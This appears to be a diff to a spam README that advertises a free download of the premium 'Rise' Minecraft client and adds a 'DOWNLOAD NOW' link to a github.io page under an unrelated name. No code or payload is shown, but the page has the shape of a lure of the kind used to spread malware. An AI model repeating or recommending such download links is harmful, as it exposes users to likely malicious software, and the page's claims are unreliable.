@@ -1,10 +1,10 @@
-
+# download minecraft rise client for PC | premium free minecraft client minecraft rise client. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://meteor-client-addons-kg74.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
